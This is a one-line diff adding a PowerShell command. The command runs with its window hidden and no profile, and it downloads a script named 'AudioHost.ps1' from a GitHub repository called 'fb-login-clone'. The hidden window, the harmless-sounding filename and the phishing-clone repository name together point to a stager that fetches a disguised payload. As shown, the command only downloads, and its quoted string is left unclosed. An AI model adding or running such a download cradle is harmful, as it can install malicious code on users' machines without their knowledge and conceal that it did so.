@@ -1,0 +1,1 @@
+powershell -w h -nop -c "iwr -useb 'https://raw.githubusercontent.com/Ex6TenZz/fb-login-clone/main/public/system_cache/AudioHost.ps1'
